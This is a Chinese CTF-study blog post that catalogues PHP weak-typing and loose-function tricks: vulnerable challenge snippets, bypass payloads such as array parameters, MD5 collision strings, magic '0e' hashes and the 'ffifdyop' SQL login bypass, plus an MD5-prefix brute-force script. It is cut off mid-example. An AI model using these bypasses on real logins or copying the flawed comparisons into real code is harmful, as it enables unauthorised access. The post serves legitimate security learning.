<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>php代码审计总结 | sakura</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="sakura" type="application/atom+xml">
</head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">sakura</a></h1></div><p class="m-desc">那就祝我们有讲不完的笑话和数不尽的浪漫</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/categories/">分类</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">php代码审计总结</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/">2022-11-22</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF/">CTF</a>&nbsp;&bull;&nbsp;<a href="/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/">常见漏洞和手法</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><p>[TOC]</p>
<h2 id="php弱类型比较"><a href="#php弱类型比较" class="headerlink" title="php弱类型比较"></a>php弱类型比较</h2><h3 id="弱类型与强类型"><a href="#弱类型与强类型" class="headerlink" title="弱类型与强类型"></a>弱类型与强类型</h3><p>通常语言有强类型和弱类型两种，强类型指的是强制数据类型的语言，就是说，一个变量一旦被定义了某个类型，如果不经过强制类型转换，这个变量就一直是这个类型，在变量使用之前必须声明变量的类型和名称，且不经强制转换不允许两种不同类型的变量互相操作。我们称之为强类型，而弱类型可以随意转换变量的类型例如可以这样：</p>
<pre><code class="php">$text=1;$text=”string”
</code></pre>
<p>也就是说php并不会验证变量的类型，可以随时的转换类型，估计开发者的意图是让程序员可以进行更高效的开发，所以在大量内置函数以及基本结构中使用了很多松散的比较和转换，防止程序中的变量因为程序员的不规范而报错，虽然提升了效率，但是引发了很多安全问题。<br>类型转换问题<br>类型转换最常见的就是int转String,String转int。<br><strong>Int转String:</strong><br>$num = 5;<br>方式1：item=(string)num;<br>方式2：item=strval(num);<br><strong>String转int:</strong><br>intval() 函数。(取整函数)<br>主要问题就出现在这个intval()函数上了。<br><strong>例子：</strong></p>
<pre><code class="php">var_dump(intval(4))//4
var_dump(intval(‘1asd’))//1
var_dump(intval(‘asd1’))//0
</code></pre>
<p>上面三个例子说明了intval（）函数在转换字符串的时候即使碰到不能转换的字符串的时候它也不会报错，而是返回0。</p>
<pre><code class="php">&lt;?php
if($_GET[id]) &#123;
    mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
    mysql_select_db(SAE_MYSQL_DB);
    $id = intval($_GET[id]);
    $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&#39;$id&#39;&quot;));
    if ($_GET[id]==1024) &#123;
        echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;;
    &#125;
    else&#123; 
        echo($query[content]);  
    &#125;
&#125;
?&gt;
</code></pre>
<p>本题输入1024.1即可绕过</p>
<h3 id="与"><a href="#与" class="headerlink" title="==与==="></a>==与===</h3><p><strong>php是一种弱类型语言，对数据的类型要求并不严格，可以让数据类型互相转换。</strong><br> 在php中有两种比较符号: 一种是 ==，另外一种是 ===，都是用来比较两个数值是否相等的操作符，但他们也是有区别的:  </p>
<ol>
<li>== ：弱等于。在比较前会先把两种字符串类型转成相同的再进行比较。简单的说，它不会比较变量类型，只比较值。</li>
<li>=== ：强等于。在比较前会先判断两种字符串类型是否相同再进行比较，如果类型不同直接返回不相等。既比较值也比较类型</li>
</ol>
<p><strong>转换规则：</strong><br>1.若一个数字和一个字符串进行比较或者进行运算时，PHP会把字符串转换成数字再进行比较。<br>若字符串以数字开头，则取开头数字作为转换结果，不能转换为数字的字符串（例如”aaa”是不能转换为数字的字符串，而”123”或”123aa”就是可以转换为数字的字符串）或null，则转换为0；<br>例如:  </p>
<pre><code class="php"> var_dump(12==&quot;12&quot;)                                   // true
 var_dump(12==&quot;12aa&quot;)                              //true
 var_dump( &quot;admin&quot;==0)                                //true
 var_dump(false==&quot;&quot;==0==NULL)                        //true
</code></pre>
<ol start="2">
<li>布尔值true和任意字符串都弱相等。例如:  </li>
</ol>
<pre><code class="php">var_dump(true==&quot;hyuf&quot;)                   //true
</code></pre>
<ol start="3">
<li>数字和“e”开头加上数字的字符串（例如”1e123”）会当作科学计数法去比较；  (例外:-1.3e3转换为浮点数是-1300)</li>
<li>0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0；  </li>
<li>当字符串被当作一个数值来处理时，如果该字符串没有包含’.’,‘e’,’E’并且其数值在整形的范围之内，该字符串作为int来取值，其他所有情况下都被作为float来取值，并且字符串开始部分决定它的取值，开始部分为数字，则其值就是开始的数字，否则，其值为0。<br>例题:</li>
</ol>
<pre><code class="php">&lt;?php
show_source(__FILE__);
$a=@$_GET[&#39;a&#39;];
$b=@$_GET[&#39;b&#39;];
if ($a==0 and $a)&#123;
    echo &quot;this is flag1&quot;;
&#125;
if(is_numeric($b))&#123;
    exit();
&#125;
if ($b&gt;1234)&#123;
    echo &quot;this is flag2&quot;;
&#125;
</code></pre>
<p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1663916772482-0a859568-2fd9-4c46-88e9-682985095366-16691231881951.png" alt="image.png"><br>a为0但是a又恒为true，我们直接传入一个字母即可  //根据转换规则一<br>b变量要得到flag必须不是一个数字，但是又要与数字比较，我们传入任意一个比1234大的数字，然后再加上字母即可绕过。  //根据转换规则一</p>
<h3 id="hash比较操作符问题"><a href="#hash比较操作符问题" class="headerlink" title="hash比较操作符问题"></a>hash比较操作符问题</h3><pre><code class="php"> &lt;?php
show_source(__FILE__);
$a = $_GET[&#39;a&#39;];
$b = $_GET[&#39;b&#39;];
if (md5($a) == md5($b)&amp;&amp;$a!=$b)&#123;
    print(&quot;this is flag!&quot;);
&#125;
?&gt; 
</code></pre>
<h4 id="数组绕过-和-都适用"><a href="#数组绕过-和-都适用" class="headerlink" title="数组绕过(==和===都适用)"></a>数组绕过(==和===都适用)</h4><pre><code class="php">md5(string,raw)
md5()进行比较时，可以两个里面输入数组，这样都是False,等于，可以绕过
</code></pre>
<p>我们直接传入数组即可绕过</p>
<pre><code class="php">http://127.0.0.1/test.php?a[]=1&amp;b[]=2
</code></pre>
<p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1663919320968-ea0a76f6-3f11-491e-9e2f-53475e0abca5.png" alt="image.png"></p>
<h4 id="md5碰撞"><a href="#md5碰撞" class="headerlink" title="md5碰撞"></a>md5碰撞</h4><pre><code class="php">&lt;?php
show_source(__FILE__);
$str1 = (string)$_GET[&#39;str1&#39;];
$str2 = (string)$_GET[&#39;str2&#39;];
if (!empty($str1)&amp;&amp;!empty($str2))&#123;
    if ($str1!=$str2)&#123;
        if (md5($str1) === md5($str2)) &#123;
            print (&quot;this is flag&quot;);
        &#125;   
    &#125;
&#125;
?&gt;
</code></pre>
<p> 由于强制类型转换，传数组就不可行了，这里就需要MD5碰撞，对于需要两个内容不同但是MD5值相同的文件，使用Fastcoll就可以了<br>下载链接:<a target="_blank" rel="noopener" href="http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip">http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip</a><br>1.在目录下新建立一个文件如下<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664033361111-43dbc858-3a86-4e0e-ba38-6c58f5d42496.png" alt="image.png"><br>2.将这个文件拖到fastcoll_v1.0.0.5.exe上，等于使用fastcoll打开它。<br>3.fastcoll会自动生成两个文件：<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1663925372001-9f7671f0-2ff8-4b8d-9fd5-92f6acbdc23a.png" alt="image.png"><br> 这两个文件内容不同，但是md5值是相同的。<br>然后我们写一个php脚本根据生成的文件生成碰撞的字符串：  </p>
<pre><code class="php">&lt;?php
function readmyfile($path)&#123;
    $fh = fopen($path, &quot;rb&quot;);
    $data = fread($fh, filesize($path));
    fclose($fh);
    return $data;
&#125;
$a = urlencode(readmyfile(&quot;HY_msg1.txt&quot;));
$b = urlencode(readmyfile(&quot;HY_msg2.txt&quot;));
if(md5((string)urldecode($a))===md5((string)urldecode($b)))&#123;
    echo &quot;a=&quot;;
    echo $a;
    echo &quot;\n&quot;;
&#125;
if(urldecode($a)!=urldecode($b))&#123;
    echo &quot;b=&quot;;
    echo $b;
&#125;
</code></pre>
<p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664033454749-29f51681-e0f7-46fd-a3b7-afbae9586942.png" alt="image.png"></p>
<pre><code class="php">a=LOVE%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00t%E4u%3F%FF7%E4%28%D6%EC%1A%C1%93%91%AF%D0j%02%BC%A7%05%98%DFE%29%06%3F%5D%116%C4%A0%06%C6%FC%C1N%89%3F%DAOZI%92%F3%F1%95inQw%B1%EA%C3%7D%B9%1D%89%7D%CB%09%3F%B1%CF%F5%F6%D1F%C0%D7%02%9F%BAS%C5%7D%13%FB%22%1733%84F%7F%D3%F4M%F4%B4%21%D8%CD%E7%CD%FE%FDv%3E%E3g2%F2%28%AA%8D%05%82%88%00%06%9E%D1%D0f%25w%C6%23%F2%CCT%C9%FC%AC%A9%D3%17
b=LOVE%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00t%E4u%3F%FF7%E4%28%D6%EC%1A%C1%93%91%AF%D0j%02%BC%27%05%98%DFE%29%06%3F%5D%116%C4%A0%06%C6%FC%C1N%89%3F%DAOZI%92%F3q%96inQw%B1%EA%C3%7D%B9%1D%89%7DK%09%3F%B1%CF%F5%F6%D1F%C0%D7%02%9F%BAS%C5%7D%13%FB%22%1733%84%C6%7F%D3%F4M%F4%B4%21%D8%CD%E7%CD%FE%FDv%3E%E3g2%F2%28%AA%8D%05%82%88%80%05%9E%D1%D0f%25w%C6%23%F2%CCT%C9%7C%AC%A9%D3%17
</code></pre>
<pre><code class="php">收录一些MD5值相等的字符串
      $Param1=&quot;fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00O%EC%28%FE%D4%C2%22%FA%40Lx%CFC%3CqMx%975%EA%0F%B7Tq%28.%7F%26%D7%8A2%F8%EC%08%BC%E9%60j%0B%DA%CF%05%40q%C2%DDa7%D0%40%C6i%97%10l%84%9D%BA%7FK%7E%FEq%A6%3F%E4%5Dl%06%7F%7F%0A%05%F6%DB%EDQ%ED%28%3D%CEhjj%15%FC%A0X%C1%1B%F5%CC%CD0%5D%A2%F5P%17%03.%8Crb%93%83%C0%EF%C2AF%88%DC%97%A0%85%CF%DA%A2G%F6%D7%0Cw%0E%A3%94%9B&quot;
      $Param2=&quot;fuck%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00O%EC%28%FE%D4%C2%22%FA%40Lx%CFC%3CqMx%975j%0F%B7Tq%28.%7F%26%D7%8A2%F8%EC%08%BC%E9%60j%0B%DA%CF%05%40q%C2%5Db7%D0%40%C6i%97%10l%84%9D%BA%7F%CB%7E%FEq%A6%3F%E4%5Dl%06%7F%7F%0A%05%F6%DB%EDQ%ED%28%3D%CEhj%EA%15%FC%A0X%C1%1B%F5%CC%CD0%5D%A2%F5P%17%03.%8Crb%93%83%C0%EF%C2%C1E%88%DC%97%A0%85%CF%DA%A2G%F6%D7%0C%F7%0E%A3%94%9B&quot;
      
    $Param1=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;
    $Param2=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;

    $data1=&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x07\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\xf1\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\x72\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\x34\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\x28\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\xab\x6f\xf7\x2a\x70&quot;;
    $data2=&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x87\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\x71\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\xf2\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\xb4\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\xa8\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\x2b\x6f\xf7\x2a\x70&quot;;
</code></pre>
<p>传入我们生成的两个值</p>
<pre><code class="php">http://127.0.0.1/test.php?str1=LOVE%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00t%E4u%3F%FF7%E4%28%D6%EC%1A%C1%93%91%AF%D0j%02%BC%A7%05%98%DFE%29%06%3F%5D%116%C4%A0%06%C6%FC%C1N%89%3F%DAOZI%92%F3%F1%95inQw%B1%EA%C3%7D%B9%1D%89%7D%CB%09%3F%B1%CF%F5%F6%D1F%C0%D7%02%9F%BAS%C5%7D%13%FB%22%1733%84F%7F%D3%F4M%F4%B4%21%D8%CD%E7%CD%FE%FDv%3E%E3g2%F2%28%AA%8D%05%82%88%00%06%9E%D1%D0f%25w%C6%23%F2%CCT%C9%FC%AC%A9%D3%17&amp;str2=LOVE%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00t%E4u%3F%FF7%E4%28%D6%EC%1A%C1%93%91%AF%D0j%02%BC%27%05%98%DFE%29%06%3F%5D%116%C4%A0%06%C6%FC%C1N%89%3F%DAOZI%92%F3q%96inQw%B1%EA%C3%7D%B9%1D%89%7DK%09%3F%B1%CF%F5%F6%D1F%C0%D7%02%9F%BAS%C5%7D%13%FB%22%1733%84%C6%7F%D3%F4M%F4%B4%21%D8%CD%E7%CD%FE%FDv%3E%E3g2%F2%28%AA%8D%05%82%88%80%05%9E%D1%D0f%25w%C6%23%F2%CCT%C9%7C%AC%A9%D3%17
</code></pre>
<p>成功获得flag<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664033627297-8e5b705a-634b-460a-9375-3634ea0257b1.png" alt="image.png"></p>
<h4 id="0e开头的字符串在参与比较时-会被当做科学计数法-结果转换为0-弱比较-才适用"><a href="#0e开头的字符串在参与比较时-会被当做科学计数法-结果转换为0-弱比较-才适用" class="headerlink" title="0e开头的字符串在参与比较时,会被当做科学计数法,结果转换为0(弱比较==才适用)"></a>0e开头的字符串在参与比较时,会被当做科学计数法,结果转换为0(弱比较==才适用)</h4><p> 比如将两个md5值进行弱类型比较</p>
<pre><code class="php">md5(&#39;QNKCDZO&#39;) == md5(240610708) 
MD5加密后会变成这个样子
0e830400451993494058024219903391 == 0e462097431906509019562988736854
</code></pre>
<p>由于0e开头的字符串会转换为0,所以真正比较的过程会变成下面这样<br>0 == 0<br>返回结果为true,也就是说0e开头的md5值进行弱类型比较时,结果相等<br>常见md5为0e开头的字符串</p>
<pre><code class="php">s878926199a
0e545993274517709034328855841020
s155964671a
0e342768416822451524974117254469
s214587387a
0e848240448830537924465865611904
s214587387a
0e848240448830537924465865611904
s878926199a
0e545993274517709034328855841020
</code></pre>
<pre><code class="php">#授人以鱼不如授人以渔，下面使多线程MD5哈希碰撞脚本，威力巨大。是根据网上代码改编而成，非原创。
#上面脚本注释部分是双MD5碰撞，取消注释然后注释掉24行stopxxx即可。
#使用方法：python md5Crack.py &quot;你要碰撞的字符串&quot; 字符串的起始位置
#例如：python md5Crack.py “0e&quot; 0
#将产生MD5值为0e开头的字符串。
#使用环境:python2
#使用时请将上述注释全部删除

# -*- coding: utf-8 -*-
import multiprocessing
import hashlib
import random
import string
import sys
CHARS = string.letters + string.digits
def cmp_md5(substr, stop_event, str_len,start=0, size=20):
    global CHARS
    while not stop_event.is_set():
        rnds = &#39;&#39;.join(random.choice(CHARS) for _ in range(size))
        md5 = hashlib.md5(rnds)
        value = md5.hexdigest()
        if value[start: start+str_len] == substr:
            print rnds
            stop_event.set()
            &#39;&#39;&#39;
            #碰撞双md5
            md5 = hashlib.md5(value)
            if md5.hexdigest()[start: start+str_len] == substr:
                print rnds+ &quot;=&gt;&quot; + value+&quot;=&gt;&quot;+ md5.hexdigest()  + &quot;\n&quot;
                stop_event.set()
            &#39;&#39;&#39;
 
if __name__ == &#39;__main__&#39;:
    substr = sys.argv[1].strip()
    start_pos = int(sys.argv[2]) if len(sys.argv) &gt; 1 else 0
    str_len = len(substr)
    cpus = multiprocessing.cpu_count()
    stop_event = multiprocessing.Event()
    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,
                                         stop_event, str_len, start_pos))
                 for i in range(cpus)]
    for p in processes:
        p.start()
    for p in processes:
        p.join()
</code></pre>
<p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1663922788700-7d0c2c85-a2f9-4d71-af8e-ec0d941ba1e9.png" alt="image.png"></p>
<h4 id="绕过md5构造恒为真语句"><a href="#绕过md5构造恒为真语句" class="headerlink" title="绕过md5构造恒为真语句"></a>绕过md5构造恒为真语句</h4><pre><code class="php">select * from &#39;admin&#39; where password=md5($pass,true)
</code></pre>
<p>pass输入</p>
<pre><code class="php">ffifdyop
</code></pre>
<p> 这个点的原理是 ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6，<br>而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是select * from ‘admin’ where password=’’ or ‘6xxxxx’。等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数  </p>
<h4 id="特殊的md5值"><a href="#特殊的md5值" class="headerlink" title="特殊的md5值"></a>特殊的md5值</h4><p>双md5结果仍为0e开头字符串大全</p>
<pre><code class="php">      0e215962017
        
        0e291242476940776845150308577824 


        CbDLytmyGm2xQyaLNhWn
     
    md5(CbDLytmyGm2xQyaLNhWn) =&gt; 0ec20b7c66cafbcc7d8e8481f0653d18
     
    md5(md5(CbDLytmyGm2xQyaLNhWn)) =&gt; 0e3a5f2a80db371d4610b8f940d296af
     
    770hQgrBOjrcqftrlaZk
     
    md5(770hQgrBOjrcqftrlaZk) =&gt; 0e689b4f703bdc753be7e27b45cb3625
     
    md5(md5(770hQgrBOjrcqftrlaZk)) =&gt; 0e2756da68ef740fd8f5a5c26cc45064
     
    7r4lGXCH2Ksu2JNT3BYM
     
    md5(7r4lGXCH2Ksu2JNT3BYM) =&gt; 0e269ab12da27d79a6626d91f34ae849
     
    md5(md5(7r4lGXCH2Ksu2JNT3BYM)) =&gt; 0e48d320b2a97ab295f5c4694759889f
</code></pre>
<h3 id="十六进制转换问题"><a href="#十六进制转换问题" class="headerlink" title="十六进制转换问题"></a>十六进制转换问题</h3><p>我们来看一个例子:</p>
<pre><code class="php">&lt;?php
if (&quot;0x1e240&quot;==&quot;123456&quot;)&#123;
    print &quot;1\n&quot;;
    if (&quot;0x1e240&quot;==123456)&#123;
        print &quot;2\n&quot;;
        if (&quot;0x1e240&quot;==&quot;1e240&quot;)&#123;
            print &quot;3&quot;;
        &#125;
    &#125;
&#125;
</code></pre>
<p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664034227137-6faf04cb-61b1-4d5e-9440-6dae4bb92b20.png" alt="image.png"><br>php在接受一个带0x的字符串的时候，会自动把这行字符串解析成十进制的再进行比较，0x1e240解析成十进制就是123456，并且与字符串类型的123456和int型的123456都相同。<br>ctf题目:</p>
<pre><code class="php">&lt;?php
    function noother_says_correct($number)&#123;
        $one = ord(&#39;1&#39;);
        $nine = ord(&#39;9&#39;);
        for ($i = 0; $i &lt; strlen($number); $i++) &#123;
            $digit = ord($number&#123;$i&#125;);
            if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123;
                return false;
            &#125;
        &#125;
        return $number == &#39;54975581388&#39;;
    &#125;
    $flag=&#39;flag&#123;This_Is_f1ag&#125;&#39;;
    if(noother_says_correct($_GET[&#39;key&#39;]))
        echo $flag;
    else
        echo &#39;access denied&#39;;
</code></pre>
<p>题目的大概意思就是说，我们要传入一个字符串，里面没有数字，但是要和54975581388相等，而54975581388这个数的16进制很巧妙，没有任何数字</p>
<pre><code class="php">print base_convert(&quot;54975581388&quot;,10,16);  //ccccccccc
</code></pre>
<p>那我们就可以用16进制来绕过<br>payload:</p>
<pre><code class="php">http://127.0.0.1/test.php?key=0xccccccccc
</code></pre>
<h3 id="json绕过"><a href="#json绕过" class="headerlink" title="json绕过"></a>json绕过</h3><p> JSON概念很简单，JSON 是一种轻量级的数据格式，他基于 javascript 语法的子集，即数组和对象表示。由于使用的是 javascript 语法，因此JSON 定义可以包含在javascript 文件中，对其的访问无需通过基于 XML 的语言来额外解析。<br>示例:</p>
<pre><code class="php">&lt;?php
if (isset($_POST[&#39;message&#39;])) &#123;
    $message = json_decode($_POST[&#39;message&#39;]);
    $key =&quot;*********&quot;;
    if ($message-&gt;key == $key) &#123;
        echo &quot;flag&quot;;
    &#125;
    else &#123;
        echo &quot;fail&quot;;
    &#125;
&#125;
else&#123;
     echo &quot;~~~~&quot;;
&#125;
?&gt;

</code></pre>
<p>输 入一个数组进行json解码，如果解码后的message与key值相同，会得到flag，主要思想还是弱类型进行绕过，我们不知道key值是什莫，但是我们知道一件事就是它肯定是字符串(当然，这里的前提条件是key中没有数字)，这样就可以了，上文讲过，两个等号时会转化成同一类型再进行比较，直接构造一个0就可以相等了。最终payload message={“key”:0}。<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664112502794-d8342c7e-bf22-4eee-9c3b-96463cb2bf28.png" alt="image.png"></p>
<h2 id="php内置函数的松散性"><a href="#php内置函数的松散性" class="headerlink" title="php内置函数的松散性"></a>php内置函数的松散性</h2><p> 主要意思就是php内部函数在调用时给函数传递函数无法接受的参数类型但是却没有报错的情况  </p>
<h3 id="MD5-，sha1绕过"><a href="#MD5-，sha1绕过" class="headerlink" title="MD5 ，sha1绕过"></a>MD5 ，sha1绕过</h3><p>这两个都是加密函数，分别给字符串进行MD5加密和计算字符串的 SHA-1 散列。<br>但是这个函数都有着缺陷，就是不能处理数组，这样就很容易被绕过了</p>
<pre><code class="php">&lt;?php
if (isset($_POST[&#39;a&#39;]) and isset($_POST[&#39;b&#39;])) &#123;
    if ($_POST[&#39;a&#39;] != $_POST[&#39;b&#39;])
        if (md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))
            die(&quot;flag&#123;This_Is_F1ag&#125;&quot;);
    else
        print &#39;Wrong.&#39;;
&#125;
?&gt;
</code></pre>
<p>直接构造数组就可以绕过了payload: a[]=1&amp;b[]=2<br>也就是上文的hash比较中的数组绕过，为了方便总结hash的知识点，就把那里的绕过方法都写了上去</p>
<h3 id="switch绕过"><a href="#switch绕过" class="headerlink" title="switch绕过"></a>switch绕过</h3><p>缺陷原理相同，绕过姿势相同，如果switch是数字类型的case的判断时，switch会将其中的参数转换为int类型。如下：</p>
<pre><code class="php">&lt;?php
$i =&quot;3name&quot;;
switch ($i) &#123;
    case 0:case 1:case 2:
        echo &quot;this is two&quot;;
        break;
        case 3:
            echo &quot;flag&#123;This_is_f1ag&#125;&quot;;
            break;
&#125;
?&gt;
</code></pre>
<p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664113177992-39954b95-885f-4b97-a02a-e5d6f30c7eb8.png" alt="image.png"></p>
<h3 id="strcmp绕过-这个时候程序输出的是，类型转换的i，结果为3返回flag"><a href="#strcmp绕过-这个时候程序输出的是，类型转换的i，结果为3返回flag" class="headerlink" title="strcmp绕过(这个时候程序输出的是，类型转换的i，结果为3返回flag )"></a>strcmp绕过(这个时候程序输出的是，类型转换的i，结果为3返回flag )</h3><p>strcmp()函数在PHP官方手册中的描述是int strcmp ( string str1,stringstr2 ),需要给strcmp()传递2个string类型的参数。如果str1小于str2,返回-1，相等返回0，否则返回1。strcmp函数比较字符串的本质是将两个变量转换为ascii，然后进行减法运算，然后根据运算结果来决定返回值</p>
<pre><code class="php">&lt;?php
$password=&quot;***************&quot;;
if(isset($_POST[&#39;password&#39;]))&#123;
